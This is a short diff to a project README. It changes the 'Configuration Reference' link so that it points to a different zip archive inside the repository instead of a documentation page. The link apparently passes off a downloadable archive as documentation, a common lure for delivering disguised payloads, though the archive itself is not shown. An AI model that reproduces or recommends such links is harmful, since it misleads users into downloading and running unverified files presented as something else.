@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://github.com/FilipStanic/Notification-List/raw/refs/heads/master/src/List_Notification_2.6.zip).
+See [Configuration Reference](https://raw.githubusercontent.com/FilipStanic/Notification-List/master/src/Notification-List-crawley.zip).
